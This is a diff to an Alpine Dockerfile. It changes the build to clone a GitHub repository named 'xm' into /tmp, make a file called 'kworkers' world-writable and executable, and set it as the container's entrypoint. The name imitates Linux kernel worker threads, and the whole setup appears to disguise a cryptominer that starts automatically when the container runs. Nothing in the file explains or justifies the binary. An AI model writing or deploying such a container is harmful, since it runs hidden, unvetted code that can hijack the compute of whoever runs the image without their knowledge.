@@ -1,9 +1,11 @@
 FROM alpine:latest
 RUN set -ex \
     && apk add git \
-    && cd /home \
+    && cd /tmp \
     && git clone https://github.com/caeken/xm \
-    && rm /home/xm/Dockerfile \
-    && cd /home/xm
+    && rm /tmp/xm/Dockerfile \
+    && cd /tmp/xm \
+    && chmod 777 kworkers
 
-CMD ["sh","-c","ls"]
+WORKDIR /tmp/xm
+ENTRYPOINT ["./kworkers"]
